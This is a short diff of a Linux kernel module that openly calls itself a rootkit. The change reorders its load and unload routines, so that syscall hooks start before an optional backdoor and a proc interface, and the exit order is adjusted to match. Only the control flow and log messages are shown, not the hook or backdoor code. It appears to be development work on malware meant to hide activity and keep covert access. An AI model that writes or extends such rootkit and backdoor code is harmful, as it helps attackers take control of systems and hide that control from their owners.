@@ -17,16 +17,16 @@
 //insmod
 static int lkm_init(void){
     printk("ROOTKIT: Starting Rootkit ---------------------------------\n");
+    if (hooks_init() == -1){
+        printk(KERN_INFO "ROOTKIT: ERROR HOOKS\n");
+        goto err_hooks;
+    }
+
 	if (BACKDOOR){
         if (backdoor_init() == -1){
             printk(KERN_INFO "ROOTKIT: ERROR BACKDOOR INIT\n");
             return -1;
         }
-    }
-
-    if (hooks_init() == -1){
-        printk(KERN_INFO "ROOTKIT: ERROR HOOKS\n");
-        goto err_hooks;
     }
 
     if (proc_init() == -1){
@@ -47,10 +47,10 @@ static int lkm_init(void){
 
 //rmmod
 static void lkm_exit(void){
-    printk("ROOTKIT: Finishing Rootkit ---------------------------------\n\n");
     proc_exit();
-    hooks_exit();
 	if (BACKDOOR) backdoor_exit();
+    hooks_exit();
+    printk("ROOTKIT: Finishing Rootkit ---------------------------------\n\n");
 }
 
 module_init(lkm_init);
